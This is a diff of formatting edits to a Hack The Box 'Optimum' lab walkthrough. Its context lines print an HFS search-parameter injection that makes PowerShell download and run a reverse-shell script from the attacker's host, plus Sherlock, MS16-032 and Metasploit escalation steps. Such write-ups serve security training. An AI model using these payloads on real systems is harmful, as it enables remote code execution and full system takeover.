@@ -10,7 +10,7 @@ categories: HackTheBox OSCP-Like
 
 We are going to pwn Optimum from Hack The Box.
 
-Link : <https://www.hackthebox.eu/home/machines/profile/6>
+Link : [https://www.hackthebox.eu/home/machines/profile/6](https://www.hackthebox.eu/home/machines/profile/6)
 
 
 Lets Begin with our Initial Nmap Scan.
@@ -70,14 +70,14 @@ Above shows an example of an interactive PowerShell bind connect shell. Use a ne
 PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
 ```
 
-I copied one of the example and changed it to my IP and paste it in bottom of the file.<br/>
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/4.png)<br/>
+I copied one of the example and changed it to my IP and paste it in bottom of the file.[br/](br/)
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/4.png)[br/](br/)
 This not only load the module but also the shell give me a callback.
 
 ## Getting User Shell
 
-We need to start ``python`` server inorder to download it to the box. Started my ``netcat`` listener too.<br/>
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/5.png)<br/>
+We need to start ``python`` server inorder to download it to the box. Started my ``netcat`` listener too.[br/](br/)
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/5.png)[br/](br/)
 
 Now its time to upload the module to the box
 
@@ -91,10 +91,10 @@ I added the location of the ``powershell.exe`` in windows along with the command
 /?search=%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8000/Invoke-PowerShellTcp.ps1').}
 ```
 
-With URL encoded I passed it to burp.<br/>
+With URL encoded I passed it to burp.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/6.png)
 
-``Status 200`` means it successfully downloaded to the box.<br/>
+``Status 200`` means it successfully downloaded to the box.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/7.png)
 
 At the sametime I got the shell in ``nc listener``
@@ -105,7 +105,7 @@ At the sametime I got the shell in ``nc listener``
 
 Once I got a shell the first thing I check is ``systeminfo``
 
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/20.png)<br/>
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/20.png)[br/](br/)
 I found some ``Hotfix's``
 
 >A hotfix or quick-fix engineering update is a single, cumulative package that includes information that is used to address a problem in a software product.
@@ -116,15 +116,15 @@ So we can use [Sherlock](https://github.com/rasta-mouse/Sherlock) to find the mi
 
 `Sherlock.ps1`
 
-So we need to ``Find AllVulns`` Copy that and paste it in the bottom of the file as we did before.<br/>
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/9.png)<br/>
+So we need to ``Find AllVulns`` Copy that and paste it in the bottom of the file as we did before.[br/](br/)
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/9.png)[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/10.png)
 
 Our python server is already ON so we can download it in the box. No need to represent ``powershell(PS)`` because we already in a powershell.
 
 > IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8000/Sherlock.ps1')
 
-Once its executed it displays the output.<br/>
+Once its executed it displays the output.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/11.png)
 
 Only these are appears to be vulnerable.
@@ -167,7 +167,7 @@ Copy the example and paste it in the bottom of the file with changes. I copied t
 
 Note: ``Invoke-MS16032`` must be as same as in the top of the script.
 
-``root.ps1``<br/>
+``root.ps1``[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/13.png)
 
 On the box:
@@ -184,16 +184,16 @@ We are System!!
 
 > use exploit/windows/http/rejetto_hfs_exec
 
-Set LHOST and LPORT<br/>
+Set LHOST and LPORT[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/15.png)
 
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/16.png)
 
-For privilege escalation, background the session and start ``local_exploit_suggester``<br/>
+For privilege escalation, background the session and start ``local_exploit_suggester``[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/17.png)
 
 We already know its vulnerable to ``ms16_032``, So I used that exploit
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/18.png)<br/>
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/18.png)[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-optimum/19.png)
 
 We got authority\system !! 
